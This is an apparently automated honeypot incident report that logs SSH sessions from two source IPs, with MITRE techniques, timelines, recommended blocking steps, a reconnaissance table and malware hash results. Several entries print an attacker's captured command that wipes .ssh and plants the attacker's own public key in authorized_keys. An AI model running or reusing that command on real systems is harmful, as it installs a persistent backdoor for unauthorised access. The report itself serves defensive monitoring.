| `2026-04-16 07:15:29` | `cowrie.log.closed` |
| `2026-04-16 07:15:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `72.79.42[.]117` to AbuseIPDB if not already reported
- [ ] Block `72.79.42[.]117` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cf77c0e29c6c

| Field | Detail |
|---|---|
| **Source IP** | `165.154.6[.]56` |
| **First Seen** | 2026-04-16 07:15 |
| **Last Seen** | 2026-04-16 07:15 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-16 07:15:28` | `cowrie.session.connect` |
| `2026-04-16 07:15:28` | `cowrie.client.version` |
| `2026-04-16 07:15:28` | `cowrie.client.kex` |
| `2026-04-16 07:15:29` | `cowrie.login.success` |
| `2026-04-16 07:15:29` | `cowrie.session.params` |
| `2026-04-16 07:15:29` | `cowrie.command.input` |
| `2026-04-16 07:15:29` | `cowrie.command.failed` |
| `2026-04-16 07:15:29` | `cowrie.log.closed` |
| `2026-04-16 07:15:29` | `cowrie.session.params` |
| `2026-04-16 07:15:29` | `cowrie.command.input` |
| `2026-04-16 07:15:29` | `cowrie.session.file_download` |
| `2026-04-16 07:15:29` | `cowrie.log.closed` |
| `2026-04-16 07:15:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.154.6[.]56` to AbuseIPDB if not already reported
- [ ] Block `165.154.6[.]56` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-08b4f6e66167

| Field | Detail |
|---|---|
| **Source IP** | `165.154.6[.]56` |
| **First Seen** | 2026-04-16 07:15 |
| **Last Seen** | 2026-04-16 07:15 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-16 07:15:31` | `cowrie.session.connect` |
| `2026-04-16 07:15:31` | `cowrie.client.version` |
| `2026-04-16 07:15:31` | `cowrie.client.kex` |
| `2026-04-16 07:15:32` | `cowrie.login.success` |
| `2026-04-16 07:15:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.154.6[.]56` to AbuseIPDB if not already reported
- [ ] Block `165.154.6[.]56` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-429f29ab9f42

| Field | Detail |
|---|---|
| **Source IP** | `72.79.42[.]117` |
| **First Seen** | 2026-04-16 07:15 |
| **Last Seen** | 2026-04-16 07:15 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-16 07:15:32` | `cowrie.session.connect` |
| `2026-04-16 07:15:32` | `cowrie.client.version` |
| `2026-04-16 07:15:32` | `cowrie.client.kex` |
| `2026-04-16 07:15:33` | `cowrie.login.success` |
| `2026-04-16 07:15:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `72.79.42[.]117` to AbuseIPDB if not already reported
- [ ] Block `72.79.42[.]117` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b1cee9e85326

| Field | Detail |
|---|---|
| **Source IP** | `165.154.6[.]56` |
| **First Seen** | 2026-04-16 07:25 |
| **Last Seen** | 2026-04-16 07:25 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-16 07:25:24` | `cowrie.session.connect` |
| `2026-04-16 07:25:24` | `cowrie.client.version` |
| `2026-04-16 07:25:24` | `cowrie.client.kex` |
| `2026-04-16 07:25:24` | `cowrie.login.success` |
| `2026-04-16 07:25:25` | `cowrie.session.params` |
| `2026-04-16 07:25:25` | `cowrie.command.input` |
| `2026-04-16 07:25:25` | `cowrie.command.failed` |
| `2026-04-16 07:25:25` | `cowrie.log.closed` |
| `2026-04-16 07:25:25` | `cowrie.session.params` |
| `2026-04-16 07:25:25` | `cowrie.command.input` |
| `2026-04-16 07:25:25` | `cowrie.session.file_download` |
| `2026-04-16 07:25:25` | `cowrie.log.closed` |
| `2026-04-16 07:25:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.154.6[.]56` to AbuseIPDB if not already reported
- [ ] Block `165.154.6[.]56` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a0dec713b7da

| Field | Detail |
|---|---|
| **Source IP** | `165.154.6[.]56` |
| **First Seen** | 2026-04-16 07:25 |
| **Last Seen** | 2026-04-16 07:25 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-16 07:25:27` | `cowrie.session.connect` |
| `2026-04-16 07:25:27` | `cowrie.client.version` |
| `2026-04-16 07:25:27` | `cowrie.client.kex` |
| `2026-04-16 07:25:28` | `cowrie.login.success` |
| `2026-04-16 07:25:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.154.6[.]56` to AbuseIPDB if not already reported
- [ ] Block `165.154.6[.]56` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-36cc7467ea52

| Field | Detail |
|---|---|
| **Source IP** | `165.154.6[.]56` |
| **First Seen** | 2026-04-16 07:27 |
| **Last Seen** | 2026-04-16 07:27 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-16 07:27:03` | `cowrie.session.connect` |
| `2026-04-16 07:27:03` | `cowrie.client.version` |
| `2026-04-16 07:27:03` | `cowrie.client.kex` |
| `2026-04-16 07:27:04` | `cowrie.login.success` |
| `2026-04-16 07:27:04` | `cowrie.session.params` |
| `2026-04-16 07:27:04` | `cowrie.command.input` |
| `2026-04-16 07:27:04` | `cowrie.command.failed` |
| `2026-04-16 07:27:04` | `cowrie.log.closed` |
| `2026-04-16 07:27:05` | `cowrie.session.params` |
| `2026-04-16 07:27:05` | `cowrie.command.input` |
| `2026-04-16 07:27:05` | `cowrie.session.file_download` |
| `2026-04-16 07:27:05` | `cowrie.log.closed` |
| `2026-04-16 07:27:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.154.6[.]56` to AbuseIPDB if not already reported
- [ ] Block `165.154.6[.]56` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-036df6c707a8

| Field | Detail |
|---|---|
| **Source IP** | `165.154.6[.]56` |
| **First Seen** | 2026-04-16 07:27 |
| **Last Seen** | 2026-04-16 07:27 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-16 07:27:07` | `cowrie.session.connect` |
| `2026-04-16 07:27:07` | `cowrie.client.version` |
| `2026-04-16 07:27:07` | `cowrie.client.kex` |
| `2026-04-16 07:27:07` | `cowrie.login.success` |
| `2026-04-16 07:27:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.154.6[.]56` to AbuseIPDB if not already reported
- [ ] Block `165.154.6[.]56` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-474124497896

| Field | Detail |
|---|---|
| **Source IP** | `165.154.6[.]56` |
| **First Seen** | 2026-04-16 07:30 |
| **Last Seen** | 2026-04-16 07:30 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-16 07:30:16` | `cowrie.session.connect` |
| `2026-04-16 07:30:16` | `cowrie.client.version` |
| `2026-04-16 07:30:16` | `cowrie.client.kex` |
| `2026-04-16 07:30:17` | `cowrie.login.success` |
| `2026-04-16 07:30:17` | `cowrie.session.params` |
| `2026-04-16 07:30:17` | `cowrie.command.input` |
| `2026-04-16 07:30:17` | `cowrie.command.failed` |
| `2026-04-16 07:30:17` | `cowrie.log.closed` |
| `2026-04-16 07:30:18` | `cowrie.session.params` |
| `2026-04-16 07:30:18` | `cowrie.command.input` |
| `2026-04-16 07:30:18` | `cowrie.session.file_download` |
| `2026-04-16 07:30:18` | `cowrie.log.closed` |
| `2026-04-16 07:30:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.154.6[.]56` to AbuseIPDB if not already reported
- [ ] Block `165.154.6[.]56` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c89b978f8060

| Field | Detail |
|---|---|
| **Source IP** | `165.154.6[.]56` |
| **First Seen** | 2026-04-16 07:30 |
| **Last Seen** | 2026-04-16 07:30 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-16 07:30:20` | `cowrie.session.connect` |
| `2026-04-16 07:30:20` | `cowrie.client.version` |
| `2026-04-16 07:30:20` | `cowrie.client.kex` |
| `2026-04-16 07:30:20` | `cowrie.login.success` |
| `2026-04-16 07:30:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.154.6[.]56` to AbuseIPDB if not already reported
- [ ] Block `165.154.6[.]56` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-467a7a8e2397

| Field | Detail |
|---|---|
| **Source IP** | `165.154.6[.]56` |
| **First Seen** | 2026-04-16 07:31 |
| **Last Seen** | 2026-04-16 07:32 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-16 07:31:57` | `cowrie.session.connect` |
| `2026-04-16 07:31:57` | `cowrie.client.version` |
| `2026-04-16 07:31:57` | `cowrie.client.kex` |
| `2026-04-16 07:31:58` | `cowrie.login.success` |
| `2026-04-16 07:31:58` | `cowrie.session.params` |
| `2026-04-16 07:31:58` | `cowrie.command.input` |
| `2026-04-16 07:31:58` | `cowrie.command.failed` |
| `2026-04-16 07:31:58` | `cowrie.log.closed` |
| `2026-04-16 07:31:58` | `cowrie.session.params` |
| `2026-04-16 07:31:58` | `cowrie.command.input` |
| `2026-04-16 07:31:58` | `cowrie.session.file_download` |
| `2026-04-16 07:31:58` | `cowrie.log.closed` |
| `2026-04-16 07:32:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.154.6[.]56` to AbuseIPDB if not already reported
- [ ] Block `165.154.6[.]56` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-73deaf144e1e

| Field | Detail |
|---|---|
| **Source IP** | `165.154.6[.]56` |
| **First Seen** | 2026-04-16 07:32 |
| **Last Seen** | 2026-04-16 07:32 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-16 07:32:00` | `cowrie.session.connect` |
| `2026-04-16 07:32:00` | `cowrie.client.version` |
| `2026-04-16 07:32:00` | `cowrie.client.kex` |
| `2026-04-16 07:32:01` | `cowrie.login.success` |
| `2026-04-16 07:32:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.154.6[.]56` to AbuseIPDB if not already reported
- [ ] Block `165.154.6[.]56` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ec6105fdb92a

| Field | Detail |
|---|---|
| **Source IP** | `165.154.6[.]56` |
| **First Seen** | 2026-04-16 07:35 |
| **Last Seen** | 2026-04-16 07:35 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-16 07:35:11` | `cowrie.session.connect` |
| `2026-04-16 07:35:11` | `cowrie.client.version` |
| `2026-04-16 07:35:11` | `cowrie.client.kex` |
| `2026-04-16 07:35:12` | `cowrie.login.success` |
| `2026-04-16 07:35:12` | `cowrie.session.params` |
| `2026-04-16 07:35:12` | `cowrie.command.input` |
| `2026-04-16 07:35:12` | `cowrie.command.failed` |
| `2026-04-16 07:35:12` | `cowrie.log.closed` |
| `2026-04-16 07:35:12` | `cowrie.session.params` |
| `2026-04-16 07:35:12` | `cowrie.command.input` |
| `2026-04-16 07:35:12` | `cowrie.session.file_download` |
| `2026-04-16 07:35:12` | `cowrie.log.closed` |
| `2026-04-16 07:35:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.154.6[.]56` to AbuseIPDB if not already reported
- [ ] Block `165.154.6[.]56` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-616344ebb75f

| Field | Detail |
|---|---|
| **Source IP** | `165.154.6[.]56` |
| **First Seen** | 2026-04-16 07:35 |
| **Last Seen** | 2026-04-16 07:35 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-16 07:35:14` | `cowrie.session.connect` |
| `2026-04-16 07:35:14` | `cowrie.client.version` |
| `2026-04-16 07:35:14` | `cowrie.client.kex` |
| `2026-04-16 07:35:15` | `cowrie.login.success` |
| `2026-04-16 07:35:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.154.6[.]56` to AbuseIPDB if not already reported
- [ ] Block `165.154.6[.]56` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4608980dd4ba

| Field | Detail |
|---|---|
| **Source IP** | `165.154.6[.]56` |
| **First Seen** | 2026-04-16 07:38 |
| **Last Seen** | 2026-04-16 07:38 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-16 07:38:37` | `cowrie.session.connect` |
| `2026-04-16 07:38:37` | `cowrie.client.version` |
| `2026-04-16 07:38:37` | `cowrie.client.kex` |
| `2026-04-16 07:38:38` | `cowrie.login.success` |
| `2026-04-16 07:38:38` | `cowrie.session.params` |
| `2026-04-16 07:38:38` | `cowrie.command.input` |
| `2026-04-16 07:38:38` | `cowrie.command.failed` |
| `2026-04-16 07:38:38` | `cowrie.log.closed` |
| `2026-04-16 07:38:38` | `cowrie.session.params` |
| `2026-04-16 07:38:38` | `cowrie.command.input` |
| `2026-04-16 07:38:39` | `cowrie.session.file_download` |
| `2026-04-16 07:38:39` | `cowrie.log.closed` |
| `2026-04-16 07:38:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.154.6[.]56` to AbuseIPDB if not already reported
- [ ] Block `165.154.6[.]56` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cf9e2716c50e

| Field | Detail |
|---|---|
| **Source IP** | `165.154.6[.]56` |
| **First Seen** | 2026-04-16 07:38 |
| **Last Seen** | 2026-04-16 07:38 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-16 07:38:40` | `cowrie.session.connect` |
| `2026-04-16 07:38:40` | `cowrie.client.version` |
| `2026-04-16 07:38:41` | `cowrie.client.kex` |
| `2026-04-16 07:38:41` | `cowrie.login.success` |
| `2026-04-16 07:38:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.154.6[.]56` to AbuseIPDB if not already reported
- [ ] Block `165.154.6[.]56` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `119.160.215[.]50` | **49** | 2026-04-16 08:03 | 2026-04-16 09:18 | 9m | 0 | `T1592` | 🟠 MEDIUM |
| `165.154.6[.]56` | **25** | 2026-04-16 07:01 | 2026-04-16 07:43 | 0m | 25 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `72.79.42[.]117` | **10** | 2026-04-16 07:03 | 2026-04-16 07:16 | 0m | 10 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `1.214.179[.]202` | 1 | 2026-04-16 08:48 | 2026-04-16 08:49 | 30s | 0 | `T1592` | 🟢 LOW |
| `131.0.226[.]61` | 1 | 2026-04-16 08:24 | 2026-04-16 08:25 | 31s | 0 | `T1592` | 🟢 LOW |
| `14.103.105[.]254` | 1 | 2026-04-16 07:03 | 2026-04-16 07:05 | 120s | 0 | `T1592` | 🟢 LOW |
| `14.103.118[.]107` | 1 | 2026-04-16 07:03 | 2026-04-16 07:05 | 120s | 0 | `T1592` | 🟢 LOW |
| `14.103.121[.]78` | 1 | 2026-04-16 07:42 | 2026-04-16 07:44 | 120s | 0 | `T1592` | 🟢 LOW |
| `14.103.127[.]232` | 1 | 2026-04-16 07:03 | 2026-04-16 07:04 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `180.76.146[.]235` | 1 | 2026-04-16 07:39 | 2026-04-16 07:41 | 120s | 0 | `T1592` | 🟢 LOW |
| `183.56.235[.]140` | 1 | 2026-04-16 08:01 | 2026-04-16 08:03 | 120s | 0 | `T1592` | 🟢 LOW |
| `27.150.188[.]148` | 1 | 2026-04-16 07:05 | 2026-04-16 07:05 | 7s | 0 | `T1592` | 🟢 LOW |
| `34.67.115[.]220` | 1 | 2026-04-16 07:02 | 2026-04-16 07:02 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `36.138.202[.]60` | 1 | 2026-04-16 07:40 | 2026-04-16 07:42 | 120s | 0 | `T1592` | 🟢 LOW |
| `76.11.71[.]59` | 1 | 2026-04-16 08:22 | 2026-04-16 08:23 | 30s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (22 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/76 ✅ |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 44/100 | 🟡 MEDIUM | **36/76** 🔴 |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `38ef0580d99fb1524c13f8dc4981fe2757deb290b29f947ebc24b4b359756f63` | ELF Binary (Linux executable) (x86-64 64-bit) | `38ef0580d99fb152...` | 44/100 | 🟡 MEDIUM | **36/76** 🔴 |
| `72ce5b00ca4bfa0c18fcdf03a15e5391a85d81300783626598fe7e022e0ec538` | ELF Binary (Linux executable) (x86-64 64-bit) | `72ce5b00ca4bfa0c...` | 43/100 | 🟡 MEDIUM | **35/76** 🔴 |
| `776c0fccae481c384f5636903ce500fae22803cf8778ec9a029956bb85a68010` | ELF Binary (Linux executable) (x86-64 64-bit) | `776c0fccae481c38...` | 43/100 | 🟡 MEDIUM | **33/76** 🔴 |
